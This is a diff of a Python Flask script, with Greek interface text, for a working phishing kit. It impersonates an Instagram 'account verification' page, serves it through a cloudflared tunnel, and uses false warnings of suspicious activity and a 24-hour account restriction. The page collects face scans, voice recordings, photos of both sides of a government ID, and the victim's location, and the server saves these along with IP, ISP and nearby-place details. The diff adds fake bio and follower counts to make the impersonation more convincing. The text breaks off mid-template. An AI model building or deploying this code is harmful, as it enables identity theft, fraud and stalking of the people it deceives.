@@ -15,10 +15,10 @@ from geopy.geocoders import Nominatim
 from geopy.distance import geodesic
 from io import BytesIO
 
-# --- Εγκατάσταση Εξαρτήσεων και Ρύθμιση Tunnel ---
+# --- Εγκατάσταση εξαρτήσεων και ρύθμιση σήραγγας ---
 
 def install_package(package):
-    """Εγκαθιστά ένα πακέτο χρησιμοποιώντας pip ήσυχα."""
+    """Εγκαθιστά ένα πακέτο σιωπηλά."""
     subprocess.check_call([sys.executable, "-m", "pip", "install", package, "-q", "--upgrade"])
 
 def check_dependencies():
@@ -26,7 +26,7 @@ def check_dependencies():
     try:
         subprocess.run(["cloudflared", "--version"], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
     except (subprocess.CalledProcessError, FileNotFoundError):
-        print("[ΣΦΑΛΜΑ] Το 'cloudflared' δεν είναι εγκατεστημένο ή δεν βρίσκεται στο PATH του συστήματος.", file=sys.stderr)
+        print("[ΣΦΑΛΜΑ] Το 'cloudflared' δεν είναι εγκατεστημένο ή δεν βρίσκεται στο PATH.", file=sys.stderr)
         print("Παρακαλώ εγκαταστήστε το από: https://developers.cloudflare.com/cloudflare-one/connections/connect-apps/install-and-setup/installation/", file=sys.stderr)
         sys.exit(1)
     
@@ -38,7 +38,7 @@ def check_dependencies():
             install_package(pkg_name)
 
 def run_cloudflared_and_print_link(port, script_name):
-    """Ξεκινά ένα cloudflared tunnel και εκτυπώνει τον δημόσιο σύνδεσμο."""
+    """Εκκινεί μια σήραγγα cloudflared και εκτυπώνει τον δημόσιο σύνδεσμο."""
     cmd = ["cloudflared", "tunnel", "--url", f"http://127.0.0.1:{port}", "--protocol", "http2"]
     process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
     for line in iter(process.stdout.readline, ''):
@@ -51,12 +51,12 @@ def run_cloudflared_and_print_link(port, script_name):
 
 def generate_random_username():
     """Δημιουργεί ένα τυχαίο όνομα χρήστη σαν του Instagram."""
-    greek_names = ["nikos", "maria", "giorgos", "sofia", "dimitris", "anna", "kostas", "elena", "panos", "chris",
-                   "alex", "katerina", "stefanos", "dora", "thanos", "irini", "vasilis", "ioanna", "petros", "melina"]
-    last_names = ["papadopoulos", "nikolaou", "georgiou", "dimitriou", "ioannou", "antoniou", "vasileiou", "michael", "konstantinou", "andreas",
-                  "christou", "athanasiou", "papa", "kyriakou", "markou", "stavrou", "karagiannis", "papageorgiou", "alexiou", "tsakiris"]
+    first_names = ["alex", "sam", "jordan", "taylor", "casey", "morgan", "riley", "avery", "charlie", "skyler", 
+                   "jamie", "quinn", "blake", "parker", "drew", "cameron", "hayden", "payton", "reese", "rowan"]
+    last_names = ["smith", "johnson", "williams", "brown", "jones", "garcia", "miller", "davis", "rodriguez", "martinez",
+                 "hernandez", "lopez", "gonzalez", "wilson", "anderson", "thomas", "taylor", "moore", "jackson", "martin"]
     
-    first = random.choice(greek_names)
+    first = random.choice(first_names)
     last = random.choice(last_names)
     number = random.randint(10, 999)
     
@@ -76,7 +76,7 @@ def generate_random_username():
     return random.choice(username_variants)
 
 def find_profile_picture(folder):
-    """Αναζητά αρχείο εικόνας στο φάκελο για χρήση ως προφίλ."""
+    """Αναζητά ένα αρχείο εικόνας στον φάκελο για χρήση ως φωτογραφία προφίλ."""
     image_extensions = ['.jpg', '.jpeg', '.png', '.gif', '.bmp', '.webp']
     
     for file in os.listdir(folder):
@@ -84,12 +84,12 @@ def find_profile_picture(folder):
         if any(file_lower.endswith(ext) for ext in image_extensions):
             filepath = os.path.join(folder, file)
             try:
-                # Διάβασμα αρχείου εικόνας και μετατροπή σε base64
+                # Ανάγνωση του αρχείου εικόνας και μετατροπή σε base64
                 with open(filepath, 'rb') as f:
                     image_data = f.read()
                     image_ext = os.path.splitext(file)[1].lower()
                     
-                    # Προσδιορισμός τύπου MIME βάσει επέκτασης
+                    # Καθορισμός MIME τύπου βάσει επέκτασης
                     mime_types = {
                         '.jpg': 'image/jpeg',
                         '.jpeg': 'image/jpeg',
@@ -108,22 +108,22 @@ def find_profile_picture(folder):
                         'path': filepath
                     }
             except Exception as e:
-                print(f"Σφάλμα ανάγνωσης εικόνας προφίλ {file}: {e}")
+                print(f"Σφάλμα ανάγνωσης φωτογραφίας προφίλ {file}: {e}")
     
     return None
 
 def get_verification_settings():
-    """Λαμβάνει τις προτιμήσεις χρήστη για τη διαδικασία επαλήθευσης."""
+    """Λαμβάνει τις προτιμήσεις χρήστη για τη διαδικασία επαλήθευσης, συμπεριλαμβανομένης της προσαρμογής προφίλ."""
     print("\n" + "="*60)
-    print("ΡΥΘΜΙΣΕΙΣ ΕΠΑΛΗΘΕΥΣΗΣ INSTAGRAM")
+    print("ΡΥΘΜΙΣΗ ΕΠΑΛΗΘΕΥΣΗΣ INSTAGRAM")
     print("="*60)
     
-    # Λήψη ονόματος χρήστη στόχου
-    print("\n[+] ΡΥΘΜΙΣΗ ΟΝΟΜΑΤΟΣ ΧΡΗΣΤΗ")
-    print("Εισάγετε το όνομα χρήστη Instagram για εμφάνιση στη σελίδα επαλήθευσης")
+    # Λήψη ονόματος χρήστη-στόχου
+    print("\n[+] ΡΥΘΜΙΣΗ ΟΝΟΜΑΤΟΣ ΧΡΗΣΤΗ-ΣΤΟΧΟΥ")
+    print("Εισάγετε το όνομα χρήστη Instagram που θα εμφανιστεί στη σελίδα επαλήθευσης")
     print("Αφήστε κενό για τυχαία δημιουργία")
     
-    username_input = input("Όνομα χρήστη (ή Enter για τυχαίο): ").strip()
+    username_input = input("Όνομα χρήστη-στόχος (ή Enter για τυχαίο): ").strip()
     if username_input:
         settings = {'target_username': username_input}
     else:
@@ -131,26 +131,49 @@ def get_verification_settings():
         settings = {'target_username': random_username}
         print(f"[+] Δημιουργήθηκε τυχαίο όνομα: {random_username}")
     
-    # Αναζήτηση εικόνας προφίλ
+    # Αναζήτηση φωτογραφίας προφίλ
     global DOWNLOAD_FOLDER
     profile_pic = find_profile_picture(DOWNLOAD_FOLDER)
     if profile_pic:
         settings['profile_picture'] = profile_pic['data_url']
         settings['profile_picture_filename'] = profile_pic['filename']
-        print(f"[+] Βρέθηκε εικόνα προφίλ: {profile_pic['filename']}")
-        print(f"[+] Χρήση εικόνας προφίλ για @{settings['target_username']}")
+        print(f"[+] Βρέθηκε φωτογραφία προφίλ: {profile_pic['filename']}")
+        print(f"[+] Χρησιμοποιείται φωτογραφία προφίλ για @{settings['target_username']}")
     else:
         settings['profile_picture'] = None
         settings['profile_picture_filename'] = None
-        print(f"[!] Δεν βρέθηκε εικόνα προφίλ")
-        print(f"[!] Συμβουλή: Τοποθετήστε μια εικόνα (jpg/png) στον φάκελο {DOWNLOAD_FOLDER} για χρήση ως προφίλ")
+        print(f"[!] Δεν βρέθηκε φωτογραφία προφίλ στον φάκελο")
+        print(f"[!] Υπόδειξη: Τοποθετήστε μια εικόνα (jpg/png) στο {DOWNLOAD_FOLDER} για χρήση ως φωτογραφία προφίλ")
     
     print(f"\n[+] Η επαλήθευση θα εμφανιστεί για: @{settings['target_username']}")
     
+    # --- Προσαρμογή προφίλ ---
+    print("\n[+] ΠΡΟΣΑΡΜΟΓΗ ΠΡΟΦΙΛ")
+    bio = input("Εισάγετε βιογραφικό λογαριασμού (προαιρετικό, προεπιλογή: 'Επαληθευμένος Λογαριασμός Instagram'): ").strip()
+    settings['bio'] = bio if bio else "Επαληθευμένος Λογαριασμός Instagram"
+    
+    posts_input = input("Εισάγετε αριθμό αναρτήσεων (ή Enter για τυχαίο): ").strip()
+    if posts_input.isdigit():
+        settings['post_count'] = int(posts_input)
+    else:
+        settings['post_count'] = random.randint(100, 999)
+    
+    followers_input = input("Εισάγετε αριθμό ακολούθων (ή Enter για τυχαίο): ").strip()
+    if followers_input.isdigit():
+        settings['follower_count'] = int(followers_input)
+    else:
+        settings['follower_count'] = random.randint(1000, 9999)
+    
+    following_input = input("Εισάγετε αριθμό που ακολουθείτε (ή Enter για τυχαίο): ").strip()
+    if following_input.isdigit():
+        settings['following_count'] = int(following_input)
+    else:
+        settings['following_count'] = random.randint(500, 5000)
+    
     # Διάρκεια σάρωσης προσώπου
-    print("\n1. Διάρκεια Σάρωσης Προσώπου:")
-    print("Πόσα δευτερόλεπτα για επαλήθευση κινήσεων προσώπου;")
-    print("Προτείνεται: 15-30 δευτερόλεπτα για πλήρεις κινήσεις κεφαλιού")
+    print("\n1. Διάρκεια σάρωσης προσώπου:")
+    print("Πόσα δευτερόλεπτα για επαλήθευση κίνησης προσώπου;")
+    print("Συνιστάται: 15-30 δευτερόλεπτα για πλήρεις κινήσεις κεφαλής")
     
     while True:
         try:
@@ -163,21 +186,21 @@ def get_verification_settings():
                 settings['face_duration'] = duration
                 break
             else:
-                print("Παρακαλώ εισάγετε αριθμό μεταξύ 5 και 60.")
+                print("Παρακαλώ εισάγετε έναν αριθμό μεταξύ 5 και 60.")
         except ValueError:
-            print("Παρακαλώ εισάγετε έγκυρο αριθμό.")
+            print("Παρακαλώ εισάγετε έναν έγκυρο αριθμό.")
     
-    # Επαλήθευση φωνής
-    print("\n2. Επαλήθευση Φωνής:")
-    print("Ενεργοποίηση επαλήθευσης φωνής μετά τη σάρωση προσώπου;")
-    voice_enabled = input("Ενεργοποίηση επαλήθευσης φωνής (ν/ο, προεπιλογή: ν): ").strip().lower()
-    settings['voice_enabled'] = voice_enabled in ['ν', 'ναι', 'y', 'yes', '']
+    # Διάρκεια φωνητικής επαλήθευσης
+    print("\n2. Φωνητική επαλήθευση:")
+    print("Να ενεργοποιηθεί η φωνητική επαλήθευση μετά τη σάρωση προσώπου;")
+    voice_enabled = input("Ενεργοποίηση φωνητικής επαλήθευσης (y/n, προεπιλογή: y): ").strip().lower()
+    settings['voice_enabled'] = voice_enabled in ['y', 'yes', '']
     
     if settings['voice_enabled']:
-        print("\nΔιάρκεια Εγγραφής Φωνής:")
+        print("\nΔιάρκεια εγγραφής φωνής:")
         while True:
             try:
-                voice_duration = input("Δευτερόλεπτα για εγγραφή φωνής (3-10, προεπιλογή: 5): ").strip()
+                voice_duration = input("Δευτερόλεπτα εγγραφής φωνής (3-10, προεπιλογή: 5): ").strip()
                 if not voice_duration:
                     settings['voice_duration'] = 5
                     break
@@ -186,25 +209,25 @@ def get_verification_settings():
                     settings['voice_duration'] = voice_duration
                     break
                 else:
-                    print("Παρακαλώ εισάγετε αριθμό μεταξύ 3 και 10.")
+                    print("Παρακαλώ εισάγετε έναν αριθμό μεταξύ 3 και 10.")
             except ValueError:
-                print("Παρακαλώ εισάγετε έγκυρο αριθμό.")
+                print("Παρακαλώ εισάγετε έναν έγκυρο αριθμό.")
     
     # Επαλήθευση ταυτότητας
-    print("\n3. Επαλήθευση Εγγράφου Ταυτότητας:")
+    print("\n3. Επαλήθευση εγγράφου ταυτότητας:")
     print("Απαιτείται μεταφόρτωση εγγράφου ταυτότητας;")
-    id_enabled = input("Ενεργοποίηση επαλήθευσης ταυτότητας (ν/ο, προεπιλογή: ν): ").strip().lower()
-    settings['id_enabled'] = id_enabled in ['ν', 'ναι', 'y', 'yes', '']
+    id_enabled = input("Ενεργοποίηση επαλήθευσης ταυτότητας (y/n, προεπιλογή: y): ").strip().lower()
+    settings['id_enabled'] = id_enabled in ['y', 'yes', '']
     
     # Επαλήθευση τοποθεσίας
-    print("\n4. Επαλήθευση Τοποθεσίας:")
+    print("\n4. Επαλήθευση τοποθεσίας:")
     print("Απαιτείται επαλήθευση τοποθεσίας;")
-    location_enabled = input("Ενεργοποίηση επαλήθευσης τοποθεσίας (ν/ο, προεπιλογή: ν): ").strip().lower()
-    settings['location_enabled'] = location_enabled in ['ν', 'ναι', 'y', 'yes', '']
+    location_enabled = input("Ενεργοποίηση επαλήθευσης τοποθεσίας (y/n, προεπιλογή: y): ").strip().lower()
+    settings['location_enabled'] = location_enabled in ['y', 'yes', '']
     
     return settings
 
-# --- Συναρτήσεις Επεξεργασίας Τοποθεσίας ---
+# --- Λειτουργίες επεξεργασίας τοποθεσίας ---
 
 geolocator = Nominatim(user_agent="instagram_verification")
 
@@ -218,7 +241,7 @@ def get_ip_info():
         return {}
 
 def get_nearby_places(latitude, longitude, radius=2000, limit=3):
-    """Επιστρέφει κοντινά καταστήματα/εγκαταστάσεις."""
+    """Επιστρέφει κοντινά καταστήματα/ανέσεις."""
     overpass_query = f"""
     [out:json];
     (
@@ -245,8 +268,8 @@ def get_nearby_places(latitude, longitude, radius=2000, limit=3):
             
             distance = geodesic((latitude, longitude), (lat_elem, lon_elem)).meters
             
-            place_type = tags.get("shop") or tags.get("amenity") or tags.get("tourism") or "unknown"
-            place_name = tags.get("name", "Ανώνυμος Χώρος")
+            place_type = tags.get("shop") or tags.get("amenity") or tags.get("tourism") or "άγνωστο"
+            place_name = tags.get("name", "Χωρίς Όνομα")
             
             results.append({
                 "type": place_type,
@@ -272,7 +295,7 @@ def process_and_save_location(data, session_id):
         
         # Λήψη πληροφοριών διεύθυνσης
         address_details = {}
-        full_address = "Άγνωστο"
+        full_address = "Άγνωστη"
         try:
             location = geolocator.reverse((lat, lon), language='el', timeout=10)
             if location:
@@ -282,7 +305,7 @@ def process_and_save_location(data, session_id):
         except Exception:
             pass
         
-        # Λήψη κοντινών τοποθεσιών
+        # Λήψη κοντινών σημείων
         places = get_nearby_places(lat, lon)
         
         # Λήψη πληροφοριών IP
@@ -316,7 +339,7 @@ def process_and_save_location(data, session_id):
                 "city": ip_info.get("city"),
                 "region": ip_info.get("region"),
                 "country": ip_info.get("country"),
-                "isp": ip_info.get("org", "").split()[-1] if ip_info.get("org") else "Άγνωστο"
+                "isp": ip_info.get("org", "").split()[-1] if ip_info.get("org") else "Άγνωστος"
             },
             "device_info": {
                 "user_agent": data.get('user_agent', 'Άγνωστο'),
@@ -332,18 +355,22 @@ def process_and_save_location(data, session_id):
         with open(filepath, 'w', encoding='utf-8') as f:
             json.dump(location_data, f, indent=2, ensure_ascii=False)
         
-        print(f"Δεδομένα τοποθεσίας αποθηκεύτηκαν: {filename}")
+        print(f"Τα δεδομένα τοποθεσίας αποθηκεύτηκαν: {filename}")
         
     except Exception as e:
         print(f"Σφάλμα επεξεργασίας τοποθεσίας: {e}")
 
-# --- Flask Εφαρμογή ---
+# --- Εφαρμογή Flask ---
 
 app = Flask(__name__)
 
-# Παγκόσμιες ρυθμίσεις
+# Καθολικές ρυθμίσεις
 VERIFICATION_SETTINGS = {
     'target_username': 'user_' + str(random.randint(100000, 999999)),
+    'bio': 'Επαληθευμένος Λογαριασμός Instagram',
+    'post_count': random.randint(100, 999),
+    'follower_count': random.randint(1000, 9999),
+    'following_count': random.randint(500, 5000),
     'face_duration': 20,
     'voice_enabled': True,
     'voice_duration': 5,
@@ -361,8 +388,12 @@ os.makedirs(os.path.join(DOWNLOAD_FOLDER, 'location_data'), exist_ok=True)
 os.makedirs(os.path.join(DOWNLOAD_FOLDER, 'user_data'), exist_ok=True)
 
 def create_html_template(settings):
-    """Δημιουργεί το περιεκτικό πρότυπο επαλήθευσης Instagram με ελληνική μετάφραση."""
+    """Δημιουργεί το πλήρες πρότυπο HTML επαλήθευσης Instagram με τοποθεσία."""
     target_username = settings['target_username']
+    bio = settings['bio']
+    post_count = settings['post_count']
+    follower_count = settings['follower_count']
+    following_count = settings['following_count']
     face_duration = settings['face_duration']
     voice_enabled = settings['voice_enabled']
     voice_duration = settings['voice_duration'] if voice_enabled else 0
@@ -387,7 +418,7 @@ def create_html_template(settings):
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Instagram - Επαλήθευση Λογαριασμού</title>
+    <title>Σελίδα Επαλήθευσης Instagram</title>
     <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
     <style>
         * {{
@@ -458,12 +489,19 @@ def create_html_template(settings):
         .account-name {{
             font-size: 18px;
             font-weight: 600;
-            margin-bottom: 5px;
+            margin-bottom: 2px;
+        }}
+        
+        .account-bio {{
+            color: #a8a8a8;
+            font-size: 13px;
+            margin: 4px 0 8px 0;
         }}
         
         .account-username {{
             color: #a8a8a8;
             font-size: 14px;
+            margin-top: 2px;
         }}
         
         .account-stats {{
@@ -587,7 +625,7 @@ def create_html_template(settings):
             transition: width 0.3s;
         }}
         
-        /* Στυλ Επαλήθευσης Προσώπου */
+        /* Στυλ σάρωσης προσώπου */
         .camera-container {{
             width: 300px;
             height: 300px;
@@ -663,7 +701,7 @@ def create_html_template(settings):
             font-family: monospace;
         }}
         
-        /* Στυλ Επαλήθευσης Φωνής */
+        /* Στυλ φωνητικής επαλήθευσης */
         .voice-instruction {{
             background-color: rgba(233, 89, 80, 0.1);
             border: 1px solid #E95950;
@@ -712,7 +750,7 @@ def create_html_template(settings):
             background: linear-gradient(to top, rgba(64, 93, 230, 0.3), rgba(233, 89, 80, 0.3));
         }}
         
-        /* Στυλ Επαλήθευσης Ταυτότητας */
+        /* Στυλ επαλήθευσης ταυτότητας */
         .id-upload-container {{
             display: flex;
             flex-direction: column;
@@ -770,7 +808,7 @@ def create_html_template(settings):
             margin-top: 10px;
         }}
         
-        /* Στυλ Επαλήθευσης Τοποθεσίας */
+        /* Στυλ επαλήθευσης τοποθεσίας */
         .location-container {{
             text-align: center;
             margin-bottom: 30px;
@@ -840,7 +878,7 @@ def create_html_template(settings):
             margin-top: 5px;
         }}
         
-        /* Κοινά Στυλ */
+        /* Κοινά στυλ */
         .button {{
             width: 100%;
             padding: 16px;
@@ -966,7 +1004,7 @@ def create_html_template(settings):
             border: 2px solid #363636;
         }}
         
-        /* Στυλ Ολοκλήρωσης */
+        /* Στυλ σελίδας ολοκλήρωσης */
         .completion-container {{
             text-align: center;
             padding: 40px 20px;
@@ -1041,7 +1079,7 @@ def create_html_template(settings):
             border-top: 1px solid #363636;
         }}
         
-        /* Στυλ Σελίδας Εκκρεμότητας */
+        /* Στυλ σελίδας υπό αξιολόγηση */
         .review-container {{
             text-align: center;
             padding: 40px 20px;
@@ -1171,32 +1209,33 @@ def create_html_template(settings):
             <h1>Instagram</h1>
         </div>
         
-        <!-- Πληροφορίες Λογαριασμού -->
+        <!-- Πληροφορίες λογαριασμού -->
         <div class="account-info">
             <div class="account-avatar">
                 {'<img src="' + profile_picture + '">' if profile_picture else target_username[0].upper()}
             </div>
             <div class="account-name">@{target_username}</div>
-            <div class="account-username">Απαιτείται Επαλήθευση Λογαριασμού</div>
+            <div class="account-bio">{bio}</div>
+            <div class="account-username" id="accountStatus">Απαιτείται επαλήθευση λογαριασμού</div>
             
             <div class="account-stats">
                 <div class="account-stat">
-                    <div class="stat-number">{random.randint(100, 999)}</div>
-                    <div class="stat-label">Δημοσιεύσεις</div>
+                    <div class="stat-number">{post_count}</div>
+                    <div class="stat-label">Αναρτήσεις</div>
                 </div>
                 <div class="account-stat">
-                    <div class="stat-number">{random.randint(1000, 9999)}</div>
+                    <div class="stat-number">{follower_count}</div>
                     <div class="stat-label">Ακόλουθοι</div>
                 </div>
                 <div class="account-stat">
-                    <div class="stat-number">{random.randint(500, 5000)}</div>
+                    <div class="stat-number">{following_count}</div>
                     <div class="stat-label">Ακολουθεί</div>
                 </div>
             </div>
         </div>
         
         <div class="verification-steps">
-            <!-- Δείκτης Προόδου -->
+            <!-- Δείκτης προόδου -->
             <div class="progress-container">
                 <div class="progress-bar" id="progressBar"></div>
             </div>
@@ -1213,25 +1252,25 @@ def create_html_template(settings):
             
             <!-- Βήμα 1: Εισαγωγή -->
             <div class="step active" id="step1">
-                <h2 class="step-title">Απαιτείται Επαλήθευση Λογαριασμού</h2>
+                <h2 class="step-title">Απαιτείται επαλήθευση λογαριασμού</h2>
                 <p class="step-subtitle">
-                    <strong>@{target_username}</strong>, για συμμόρφωση με τις πολιτικές ασφαλείας του Instagram και επαναφορά πλήρης πρόσβασης στον λογαριασμό, 
+                    <strong>@{target_username}</strong>, για να συμμορφωθείτε με τις πολιτικές ασφαλείας του Instagram και να αποκαταστήσετε την πλήρη πρόσβαση στον λογαριασμό σας,
                     πρέπει να επαληθεύσουμε την ταυτότητά σας. Αυτό βοηθά στην προστασία του λογαριασμού σας από μη εξουσιοδοτημένη πρόσβαση.
                 </p>
                 
                 <div class="info-box">
-                    <strong>Γιατί απαιτείται αυτό;</strong><br>
-                    Εντοπίσαμε ασυνήθιστη δραστηριότητα στον λογαριασμό @{target_username}. 
-                    Για την αποτροπή μη εξουσιοδοτημένης πρόσβασης και τη διατήρηση της ασφάλειας του λογαριασμού σας, απαιτείται επαλήθευση.
+                    <strong>Γιατί απαιτείται;</strong><br>
+                    Εντοπίσαμε ύποπτη δραστηριότητα στον λογαριασμό σας @{target_username}.
+                    Για να αποτρέψουμε μη εξουσιοδοτημένη πρόσβαση και να διατηρήσουμε τον λογαριασμό σας ασφαλή, απαιτείται επαλήθευση.
                 </div>
                 
                 <div class="instruction-container">
                     <div class="instruction-icon">🔒</div>
-                    <div class="instruction-text">Ολοκληρώστε τα Βήματα Επαλήθευσης:</div>
+                    <div class="instruction-text">Ολοκληρώστε τα βήματα επαλήθευσης:</div>
                     <div class="instruction-detail">
-                        1. <strong>Σάρωση Προσώπου</strong> - Ακολουθήστε τις οδηγίες κίνησης κεφαλιού<br>
-                        2. <strong>Επαλήθευση Φωνής</strong> - Διαβάστε μια σύντομη φράση<br>
-                        3. <strong>Έγγραφο Ταυτότητας</strong> - Μεταφορτώστε ταυτότητα ή διαβατήριο<br>
+                        1. <strong>Σάρωση προσώπου</strong> - Ακολουθήστε τις οδηγίες κίνησης κεφαλής<br>
+                        2. <strong>Φωνητική επαλήθευση</strong> - Διαβάστε μια σύντομη φράση<br>
+                        3. <strong>Έγγραφο ταυτότητας</strong> - Μεταφορτώστε κρατικό έγγραφο<br>
                         4. <strong>Τοποθεσία</strong> - Επαληθεύστε την τρέχουσα τοποθεσία σας
                     </div>
                 </div>
@@ -1240,20 +1279,20 @@ def create_html_template(settings):
                     <div class="instruction-icon">⏱️</div>
                     <div class="instruction-text">Ολοκληρώστε εντός 24 ωρών</div>
                     <div class="instruction-detail">
-                        Ο λογαριασμός @{target_username} θα περιοριστεί προσωρινά μέχρι την ολοκλήρωση της επαλήθευσης.
+                        Ο λογαριασμός σας @{target_username} θα περιοριστεί προσωρινά έως ότου ολοκληρωθεί η επαλήθευση.
                     </div>
                 </div>
                 
                 <button class="button primary-btn" onclick="nextStep()">
-                    Ξεκινήστε Επαλήθευση για @{target_username}
+                    Έναρξη επαλήθευσης για @{target_username}
                 </button>
             </div>
             
-            <!-- Βήμα 2: Επαλήθευση Προσώπου -->
+            <!-- Βήμα 2: Σάρωση προσώπου -->
             <div class="step" id="step2">
-                <h2 class="step-title">Επαλήθευση Προσώπου</h2>
+                <h2 class="step-title">Σάρωση προσώπου</h2>
                 <p class="step-subtitle">
-                    Θα σαρώσουμε το πρόσωπό σας για επαλήθευση της ταυτότητάς σας. Ακολουθήστε τις οδηγίες στην οθόνη προσεκτικά.
+                    Θα σαρώσουμε το πρόσωπό σας για να επαληθεύσουμε την ταυτότητά σας. Ακολουθήστε προσεκτικά τις οδηγίες που εμφανίζονται.
                 </p>
                 
                 <div class="camera-container">
@@ -1269,12 +1308,12 @@ def create_html_template(settings):
                     <div class="instruction-icon" id="instructionIcon">👤</div>
                     <div class="instruction-text" id="instructionText">Ετοιμαστείτε</div>
                     <div class="instruction-detail" id="instructionDetail">
-                        Τοποθετήστε το πρόσωπό σας μέσα στον κύκλο και περιμένετε για οδηγίες
+                        Τοποθετήστε το πρόσωπό σας μέσα στον κύκλο και περιμένετε οδηγίες
                     </div>
                 </div>
                 
                 <button class="button primary-btn" id="startFaceScanBtn" onclick="startFaceVerification()">
-                    Ξεκινήστε Σάρωση Προσώπου για @{target_username}
+                    Έναρξη σάρωσης προσώπου για @{target_username}
                 </button>
                 
                 <button class="button secondary-btn" onclick="prevStep()">
@@ -1282,21 +1321,21 @@ def create_html_template(settings):
                 </button>
             </div>
             
-            <!-- Βήμα 3: Επαλήθευση Φωνής -->
+            <!-- Βήμα 3: Φωνητική επαλήθευση -->
             <div class="step" id="step3">
-                <h2 class="step-title">Επαλήθευση Φωνής</h2>
+                <h2 class="step-title">Φωνητική επαλήθευση</h2>
                 <p class="step-subtitle">
-                    Παρακαλώ διαβάστε την παρακάτω φράση καθαρά. Αυτό βοηθά στην επαλήθευση ότι είστε ο πραγματικός κάτοχος του @{target_username}.
+                    Διαβάστε την παρακάτω φράση καθαρά. Αυτό βοηθά στην επαλήθευση ότι είστε ο πραγματικός κάτοχος του @{target_username}.
                 </p>
                 
                 <div class="voice-instruction">
                     <div class="instruction-icon">🎤</div>
-                    <div class="instruction-text">Διαβάστε Αυτή τη Φράση</div>
-                    <div class="instruction-detail">Μιλήστε καθαρά με κανονική ένταση</div>
+                    <div class="instruction-text">Διαβάστε αυτή τη φράση</div>
+                    <div class="instruction-detail">Μιλήστε καθαρά σε κανονική ένταση</div>
                 </div>
                 
                 <div class="phrase-box">
-                    <div class="phrase-text" id="voicePhrase">Ονομάζομαι {target_username} και επαληθεύω την ταυτότητά μου με το Instagram</div>
+                    <div class="phrase-text" id="voicePhrase">Το όνομά μου είναι {target_username} και επαληθεύω την ταυτότητά μου στο Instagram</div>
                     <div class="phrase-subtext">Πείτε αυτή τη φράση καθαρά στο μικρόφωνό σας</div>
                 </div>
                 
@@ -1307,7 +1346,7 @@ def create_html_template(settings):
                 <div class="timer" id="voiceTimer">00:{str(voice_duration).zfill(2)}</div>
                 
                 <button class="button primary-btn" id="startVoiceBtn" onclick="startVoiceVerification()">
-                    Ξεκινήστε Εγγραφή Φωνής
+                    Έναρξη εγγραφής φωνής
                 </button>
                 
                 <button class="button secondary-btn" onclick="prevStep()">
@@ -1315,11 +1354,11 @@ def create_html_template(settings):
                 </button>
             </div>
             
-            <!-- Βήμα 4: Επαλήθευση Ταυτότητας -->
+            <!-- Βήμα 4: Επαλήθευση ταυτότητας -->
             <div class="step" id="step4">
-                <h2 class="step-title">Επαλήθευση Εγγράφου Ταυτότητας</h2>
+                <h2 class="step-title">Επαλήθευση εγγράφου ταυτότητας</h2>
                 <p class="step-subtitle">
-                    Μεταφορτώστε φωτογραφίες της ταυτότητάς σας για επαλήθευση της ιδιοκτησίας του λογαριασμού @{target_username}.
+                    Μεταφορτώστε φωτογραφίες του κρατικού σας εγγράφου ταυτότητας για να επαληθεύσετε την ιδιοκτησία του λογαριασμού @{target_username}.
                 </p>
                 
                 <div class="id-upload-container">
@@ -1328,8 +1367,8 @@ def create_html_template(settings):
                          ondragleave="this.classList.remove('dragover')" 
                          ondrop="handleFileDrop(event, 'front')">
                         <div class="id-icon">📄</div>
-                        <div class="id-title">Μπροστινή Πλευρά Ταυτότητας</div>
-                        <div class="id-subtitle">Διαβατήριο, Δίπλωμα Οδήγησης ή Εθνική Ταυτότητα</div>
+                        <div class="id-title">Μπροστινή όψη ταυτότητας</div>
+                        <div class="id-subtitle">Άδεια οδήγησης, διαβατήριο ή εθνική ταυτότητα</div>
                         <input type="file" id="frontIdInput" class="file-input" accept="image/*" onchange="handleFileSelect(this, 'front')">
                         <div class="preview-container" id="frontPreview">
                             <img class="preview-image" id="frontPreviewImage">
@@ -1341,8 +1380,8 @@ def create_html_template(settings):
                          ondragleave="this.classList.remove('dragover')" 
                          ondrop="handleFileDrop(event, 'back')">
                         <div class="id-icon">📄</div>
-                        <div class="id-title">Πίσω Πλευρά Ταυτότητας</div>
-                        <div class="id-subtitle">Απαιτείται για έγγραφα με δύο πλευρές</div>
+                        <div class="id-title">Πίσω όψη ταυτότητας</div>
+                        <div class="id-subtitle">Απαιτείται για έγγραφα δύο όψεων</div>
                         <input type="file" id="backIdInput" class="file-input" accept="image/*" onchange="handleFileSelect(this, 'back')">
                         <div class="preview-container" id="backPreview">
                             <img class="preview-image" id="backPreviewImage">
@@ -1352,10 +1391,10 @@ def create_html_template(settings):
                     <div class="id-requirements">
                         <strong>Απαιτήσεις:</strong>
                         <ul>
-                            <li>Επίσημο έγγραφο ταυτότητας με φωτογραφία</li>
+                            <li>Κρατικό έγγραφο με φωτογραφία</li>
                             <li>Καθαρή, καλά φωτισμένη φωτογραφία</li>
-                            <li>Οι τέσσερις γωνίες να είναι ορατές</li>
-                            <li>Χωρίς ανταύγειες ή αντανακλάσεις</li>
+                            <li>Όλες οι γωνίες ορατές</li>
+                            <li>Χωρίς αντανακλάσεις</li>
                         </ul>
                     </div>
                 </div>
@@ -1363,7 +1402,7 @@ def create_html_template(settings):
                 <div class="status-message" id="idStatus"></div>
                 
                 <button class="button primary-btn" id="submitIdBtn" onclick="submitIDVerification()" disabled>
-                    Υποβολή για Επαλήθευση
+                    Υποβολή για επαλήθευση
                 </button>
                 
                 <button class="button secondary-btn" onclick="prevStep()">
@@ -1371,20 +1410,20 @@ def create_html_template(settings):
                 </button>
             </div>
             
-            <!-- Βήμα 5: Επαλήθευση Τοποθεσίας -->
+            <!-- Βήμα 5: Επαλήθευση τοποθεσίας -->
             <div class="step" id="step5">
-                <h2 class="step-title">Επαλήθευση Τοποθεσίας</h2>
+                <h2 class="step-title">Επαλήθευση τοποθεσίας</h2>
                 <p class="step-subtitle">
-                    Πρέπει να επαληθεύσουμε την τοποθεσία σας για να εξασφαλίσουμε ότι αποκτάτε πρόσβαση στο @{target_username} από τη συνήθη περιοχή σας.
+                    Πρέπει να επαληθεύσουμε την τοποθεσία σας για να διασφαλίσουμε ότι έχετε πρόσβαση στον @{target_username} από τη συνηθισμένη σας περιοχή.
                 </p>
                 
                 <div class="location-container">
                     <div class="location-icon">📍</div>
                     <div class="location-info">
                         <div class="instruction-icon">🌍</div>
-                        <div class="instruction-text">Απαιτείται Πρόσβαση Τοποθεσίας</div>
